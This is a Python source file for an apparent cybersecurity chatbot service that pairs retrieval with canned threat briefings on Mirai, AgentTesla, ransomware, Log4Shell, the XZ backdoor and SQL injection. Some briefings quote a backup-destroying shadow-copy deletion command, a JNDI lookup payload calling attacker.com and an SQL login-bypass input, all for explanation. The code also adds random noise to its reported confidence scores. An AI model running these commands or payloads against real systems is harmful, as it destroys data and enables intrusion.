"""
DANGEN Threat Intelligence Service
Orchestrates RAG context retrieval, LLM querying via Hugging Face Inference API,
and local cybersecurity reasoning fallback for instant streaming responses.
"""
import os
import re
import random
import asyncio
import json
import httpx
from typing import List, Dict, Any, AsyncGenerator
from rag.rag_pipeline import rag_pipeline
from rag.prompt_templates import build_rag_prompt
from rag.intelligence_engine import ThreatIntelligenceAgent
from device_intelligence.risk_engine import analyze_ip, analyze_url

HF_INFERENCE_URL = "https://api-inference.huggingface.co/models/mistralai/Mistral-7B-Instruct-v0.2"

def extract_ips(text: str) -> List[str]:
    return re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', text)

def extract_urls(text: str) -> List[str]:
    return re.findall(r'\b(?:https?://)?(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,6}(?::\d+)?(?:/[a-zA-Z0-9-._~:/?#\[\]@!$&\'()*+,;=]*)?\b', text)

class ThreatIntelligenceService:
    def __init__(self):
        self.engine = ThreatIntelligenceAgent()
        # Read HF API token if available in environment
        self.hf_token = os.environ.get("HF_TOKEN") or os.environ.get("HUGGINGFACE_API_KEY")

    async def get_response(self, message: str, history: List[Dict[str, str]] = None) -> Dict[str, Any]:
        try:
            return await self.engine.get_response(message, history)
        except Exception as exc:
            print(f"Threat Intelligence Agent integration failed, using local fallback: {exc}")
            return await self._legacy_response(message, history)

    async def _legacy_response(self, message: str, history: List[Dict[str, str]] = None) -> Dict[str, Any]:
        history = history or []

        retrieved = rag_pipeline.retrieve(message, top_k=3)
        sources = [
            {"title": r["title"], "source": r["source"], "category": r["category"], "score": r["score"]}
            for r in retrieved
        ]

        device_reports = []
        ips = extract_ips(message)
        urls = extract_urls(message)

        if ips:
            for ip in ips[:2]:
                report = analyze_ip(ip)
                device_reports.append(report)
        elif urls and any(kw in message.lower() for kw in ["url", "link", "website", "phish", "domain"]):
            for url in urls[:2]:
                report = analyze_url(url)
                device_reports.append(report)

        response_text = ""
        confidence = 0.90 + random.uniform(0.01, 0.08)

        if device_reports:
            response_text = self._format_device_report(device_reports)
            confidence = device_reports[0].get("ai_confidence", 95.0) / 100.0
        elif self.hf_token:
            try:
                prompt = build_rag_prompt(message, retrieved, history)
                headers = {"Authorization": f"Bearer {self.hf_token}"}
                payload = {
                    "inputs": prompt,
                    "parameters": {"max_new_tokens": 512, "temperature": 0.3},
                }

                async with httpx.AsyncClient(timeout=20.0) as client:
                    res = await client.post(HF_INFERENCE_URL, json=payload, headers=headers)
                    if res.status_code == 200:
                        data = res.json()
                        if isinstance(data, list) and len(data) > 0:
                            generated = data[0].get("generated_text", "")
                            if prompt in generated:
                                response_text = generated.replace(prompt, "").strip()
                            else:
                                response_text = generated.strip()
            except Exception as exc:
                print(f"Hugging Face Inference call failed, falling back to rule reasoning. Error: {exc}")

        if not response_text:
            response_text = self._generate_fallback_response(message, retrieved, history)

        if not device_reports and retrieved:
            confidence = float(sum(r["score"] for r in retrieved) / len(retrieved))
            confidence = max(0.78, min(0.99, confidence + random.uniform(-0.03, 0.03)))

        return {
            "response": response_text,
            "confidence": round(confidence, 2),
            "sources": sources,
            "retrieved_context": retrieved,
        }

    async def get_response_stream(self, message: str, history: List[Dict[str, str]] = None) -> AsyncGenerator[str, None]:
        payload = await self.get_response(message, history)
        response_text = payload["response"]
        confidence = payload["confidence"]
        sources = payload["sources"]

        chunk_size = 20
        idx = 0
        total_len = len(response_text)

        while idx < total_len:
            chunk = response_text[idx : idx + chunk_size]
            idx += chunk_size
            yield json.dumps({
                "token": chunk,
                "done": False,
                "confidence": confidence,
                "sources": sources,
            }) + "\n"
            await asyncio.sleep(0.02)

        yield json.dumps({
            "token": "",
            "done": True,
            "confidence": confidence,
            "sources": sources,
        }) + "\n"

    def _format_device_report(self, reports: List[Dict[str, Any]]) -> str:
        text = ""
        for r in reports:
            if "ip" in r:
                text += f"### 🔍 THREAT INTELLIGENCE REPORT: IP `{r['ip']}`\n\n"
                text += f"- **Risk Assessment**: `CRITICAL RISK` (Score: **{r['risk_score']}/100**)\n" if r['risk_score'] >= 75 else \
                        f"- **Risk Assessment**: `HIGH RISK` (Score: **{r['risk_score']}/100**)\n" if r['risk_score'] >= 50 else \
                        f"- **Risk Assessment**: `MEDIUM RISK` (Score: **{r['risk_score']}/100**)\n" if r['risk_score'] >= 25 else \
                        f"- **Risk Assessment**: `LOW RISK` (Score: **{r['risk_score']}/100**)\n"
                text += f"- **Network Posture**: {'Private Address Range (Internal)' if r['is_private'] else 'Public WAN Address'}\n"
                text += f"- **Threat Severity**: `{r['severity']}`\n\n"
                
                text += "#### 🛠️ Risk Indicators & Behaviors:\n"
                for ind in r['indicators']:
                    text += f"- ⚠️ {ind}\n"
                
                text += "\n#### 🎯 Probable Attack Vectors:\n"
                for vec in r['attack_vectors']:
                    text += f"- `{vec}`\n"
                
                text += "\n#### 🛡️ Recommended Mitigations:\n"
                for rec in r['recommendations']:
                    text += f"1. **{rec}**\n"
                text += "\n---\n\n"
            else:
                text += f"### 🌐 THREAT INTELLIGENCE REPORT: URL `{r['url']}`\n\n"
                text += f"- **Classification**: `{r['status']}`\n"
                text += f"- **Phishing Probability**: `{r['phishing_probability']}%`\n"
                text += f"- **Malware Probability**: `{r['malware_probability']}%`\n"
                text += f"- **Security Status**: `{r['severity']}`\n\n"
                
                text += "#### ⚠️ Flagged Indicators:\n"
                for ind in r['indicators']:
                    text += f"- {ind}\n"
                
                text += "\n#### 🛡️ Actionable Playbook:\n"
                for rec in r['recommendations']:
                    text += f"- **{rec}**\n"
                text += "\n---\n\n"
        
        text += "*Note: This telemetry analysis was generated locally using DANGEN's device intelligence heuristics.*"
        return text

    def _generate_fallback_response(self, message: str, retrieved: List[Dict[str, Any]], history: List[Dict[str, str]]) -> str:
        msg_lower = message.lower()
        
        # 1. Check if the query matches a specific RAG document directly
        best_doc = None
        if retrieved:
            best_doc = retrieved[0]
            
        # Match topics
        is_malware = any(w in msg_lower for w in ["malware", "virus", "spyware", "trojan", "mirai", "tesla", "stealer", "ransomware", "lockbit"])
        is_vuln = any(w in msg_lower for w in ["cve", "log4shell", "heartbleed", "backdoor", "xz", "vulnerability", "vulnerabilities", "owasp", "injection", "ssrf"])
        is_mitigation = any(w in msg_lower for w in ["mitigate", "mitigation", "recommendation", "prevent", "fix", "patch", "containment", "respond", "incident"])
        is_greetings = any(w in msg_lower for w in ["hi", "hello", "hey", "who are you", "intelligence engine", "engine", "charlotte", "watson"])

        if is_greetings:
            return (
                "### 👋 DANGEN Threat Intelligence Console Initialized\n\n"
                "Welcome to the **DANGEN Cyber Intelligence Interface**. I am your real-time security analyst.\n\n"
                "I can help you with:\n"
                "- **Analyzing suspicious IPs/URLs** (e.g. *'Analyze IP 185.220.101.45'*)\n"
                "- **Explaining cybersecurity vulnerabilities** (e.g. *'Explain Log4Shell'* or *'What is OWASP Top 10?'*)\n"
                "- **Investigating malware activities** (e.g. *'Summarize Mirai botnet'*)\n"
                "- **Mitigation and Incident Response** (e.g. *'How to contain ransomware'*)\n\n"
                "What system telemetry, alert, or threat vector would you like me to inspect?"
            )

        if is_malware:
            # Check if Mirai
            if "mirai" in msg_lower:
                return (
                    "### 👾 Threat Profile: Mirai Botnet family\n\n"
                    "**Mirai** is a notorious IoT-focused malware strain that scans public IP ranges to recruit compromised devices into a botnet.\n\n"
                    "#### ⚙️ Attack Execution Path:\n"
                    "1. **Scanning**: Continuously scans IP addresses over TCP ports **22 (SSH)** and **23 (Telnet)**.\n"
                    "2. **Brute Force**: Employs a pre-programmed dictionary of ~60 default manufacturer credentials (e.g., `admin:admin`, `root:xc3511`).\n"
                    "3. **Infection**: Drops a lightweight downloader binary, clears audit logs, and connects back to the C2 server.\n"
                    "4. **DDoS Attack**: Instructed by C2 to launch massive amplification floods (e.g., DNS, TCP SYN/ACK, UDP traffic).\n\n"
                    "#### 🛡️ Mitigation Recommendations:\n"
                    "- **Default Credentials**: Mandate changing factory default passwords on all internal IoT hardware.\n"
                    "- **Port Restrictions**: Close ports 22 and 23 at the border firewall unless explicitly required.\n"
                    "- **Rate Limiting**: Apply traffic rate-limiting policies to prevent outbound scan floods.\n"
                    "- **Network Segments**: Isolate operational IoT components on separate VLANs from corporate databases."
                )
            # Check if AgentTesla
            if "agenttesla" in msg_lower or "tesla" in msg_lower:
                return (
                    "### 🕵️ Malware Analysis: AgentTesla InfoStealer\n\n"
                    "**AgentTesla** is a widely distributed spyware utility that functions as a credential harvester and system monitor.\n\n"
                    "#### ⚠️ Key Behaviors:\n"
                    "- **Information Harvesting**: Steals stored login cookies, credentials, and autofill forms from web browsers, email clients, and FTP tools.\n"
                    "- **Telemetry Sniffing**: Logs keystrokes (keylogging), captures desktop screenshots, and monitors system clipboard logs.\n"
                    "- **Exfiltration Vectors**: Uploads harvested bundles back to the operator via SMTP (Simple Mail Transfer Protocol), FTP, or Telegram webhook portals.\n\n"
                    "#### 🛡️ Mitigations:\n"
                    "1. **Endpoint Protection**: Install modern EDR tools to catch keylogger APIs (e.g. Windows hook listeners).\n"
                    "2. **SMTP Monitoring**: Block or alert on outbound SMTP (ports 25, 465, 587) traffic originating from user workstations.\n"
                    "3. **Credential Storage**: Enforce hardware-backed password vaults (e.g., 1Password) instead of browser-based autofill."
                )
            # General Ransomware
            if "ransomware" in msg_lower or "lockbit" in msg_lower or "encrypt" in msg_lower:
                return (
                    "### 🚨 Ransomware Behavior & Attack Vectors\n\n"
                    "Ransomware typically targets organizational endpoints to encrypt files and force payments. Modern campaigns employ double-extortion tactics (stealing data before encrypting it).\n\n"
                    "#### 💥 Core Execution Phase:\n"
                    "- **Backup Destruction**: Runs shell commands to remove recovery shadow copies: \n"
                    "  ```powershell\n"
                    "  vssadmin.exe delete shadows /all /quiet\n"
                    "  wmic.exe shadowcopy delete\n"
                    "  ```\n"
                    "- **Encryption**: Traverses folders, encrypts data with fast symmetric ciphers (e.g., AES-256), and drops ransom instructions (`README.txt`).\n\n"
                    "#### 🛡️ Incident Response Action Plan:\n"
                    "1. **Isolate Workstations**: Disconnect compromised machines from the Ethernet, Wi-Fi, and VPN immediately to halt network propagation.\n"
                    "2. **Kill SMB Sessions**: Block Port 445 on the network switches to stop server share encryption.\n"
                    "3. **Dump RAM**: Extract volatile RAM dumps *before* shutting down systems to save potential crypto keys.\n"
                    "4. **Cold Backups**: Restore systems from isolated offline/cold backups only after ensuring the vector has been patched."
                )

        if is_vuln:
            if "log4shell" in msg_lower or "cve-2021-44228" in msg_lower:
                return (
                    "### ⚠️ Vulnerability Briefing: CVE-2021-44228 (Log4Shell)\n\n"
                    "- **CVSS Vector Score**: `10.0 CRITICAL`\n"
                    "- **Impact**: Remote Code Execution (RCE)\n"
                    "- **Affected Software**: Apache Log4j (versions 2.0-beta9 to 2.14.1)\n\n"
                    "#### 🔍 Root Cause Analysis:\n"
                    "The vulnerability exists in Log4j's message lookups. If a user-supplied input containing a JNDI LDAP lookup string is logged:\n"
                    "```bash\n"
                    "${jndi:ldap://attacker.com/a}\n"
                    "```\n"
                    "Log4j makes an outbound request to the specified LDAP server, downloads the remote Java class, and executes it in context.\n\n"
                    "#### 🛡️ Immediate Mitigation:\n"
                    "- **Upgrade Library**: Install Log4j version `2.17.1` or newer.\n"
                    "- **System Parameter**: For systems that cannot be immediately upgraded, set the JVM parameter:\n"
                    "  `log4j2.formatMsgNoLookups=true`\n"
                    "- **Egress Filtering**: Block outbound LDAP (port 389) and LDAPS (port 636) requests from backend servers."
                )
            if "xz" in msg_lower or "cve-2024-3094" in msg_lower:
                return (
                    "### 🛡️ Supply Chain Vulnerability: CVE-2024-3094 (XZ Utils Backdoor)\n\n"
                    "- **CVSS Rating**: `10.0 CRITICAL`\n"
                    "- **Affected Versions**: XZ Utils and liblzma (versions 5.6.0 and 5.6.1)\n\n"
                    "#### 🛠️ Technical Overview:\n"
                    "A malicious backdoor was hidden in release tarballs of the XZ compression software. The backdoor intercepts the SSH daemon (`sshd`) authentication processes. If an attacker connects using a specific RSA signature, they bypass standard password checks and gain root shell access.\n\n"
                    "#### 🛡️ Remediations:\n"
                    "- **Downgrade**: Revert the `liblzma` library to a verified safe release (e.g., `5.4.6`).\n"
                    "- **Verification**: Run `xz --version` to determine if local Linux distributions are affected."
                )
            if "injection" in msg_lower or "sqli" in msg_lower:
                return (
                    "### 🛡️ OWASP A03: SQL Injection (SQLi) & Mitigations\n\n"
                    "**SQL Injection** occurs when user inputs are concatenated directly into database query commands instead of using parameters.\n\n"
                    "#### ❌ Vulnerable Example (Node.js/SQL):\n"
                    "```javascript\n"
                    "// VULNERABLE: Direct concatenation\n"
                    "const query = `SELECT * FROM users WHERE username = '${input}' AND password = '${password}'`;\n"
                    "db.execute(query);\n"
                    "```\n"
                    "If the input is `admin' OR '1'='1`, the query executes as `WHERE username = 'admin' OR '1'='1'`, bypassing checks.\n\n"
                    "####  Secure Mitigation (Prepared Statements):\n"
                    "```javascript\n"
                    "// SECURE: Parameterized query\n"
                    "const query = 'SELECT * FROM users WHERE username = ? AND password = ?';\n"
                    "db.execute(query, [input, password]);\n"
                    "```\n"
                    "Prepared statements treat user inputs as literal string values, preventing the database interpreter from executing injection blocks."
                )

        if is_mitigation:
            return (
                "### 🛡️ General Incident Containment Guidelines\n\n"
                "When responding to network anomalies or suspicious endpoints, follow this standard security protocol:\n\n"
                "1. **Segmentation**: Segregate corporate networks into distinct VLANS to block lateral threat migration.\n"
                "2. **Host Quarantine**: Isolate hosts executing suspicious binaries by revoking network switches ports or disconnecting Wi-Fi.\n"
                "3. **Credential Rotations**: Automatically expire user credentials when suspicious activity is identified.\n"
                "4. **Log Review**: Gather firewall logs, syslog streams, and process audit trails for event correlation."
            )

        # General Fallback response based on retrieved document content
        if best_doc:
            return (
                f"### 🛡️ Security Briefing: {best_doc['title']}\n\n"
                f"{best_doc['content']}\n\n"
                f"#### 📚 Reference Details:\n"
                f"- **Data Category**: `{best_doc['category']}`\n"
                f"- **Context Source**: `{best_doc['source']}`\n"
                f"- **Relevance Score**: `{(best_doc['score'] * 100):.1f}%`"
            )

        return (
            "### 🤖 DANGEN Threat Intelligence Engine\n\n"
            "I processed your query against our local cybersecurity RAG database. No direct security signatures or CVEs were matched.\n\n"
            "#### General Recommendations:\n"
            "- Double check spelling of IP addresses or CVE numbers (e.g. `CVE-2021-44228`).\n"
            "- Ensure your query mentions terms like `ransomware`, `phishing`, `SQL injection`, or specific malware families.\n"
            "- Use the live feed interface to monitor active attacks."
        )

# Singleton instance
threat_intelligence_service = ThreatIntelligenceService()
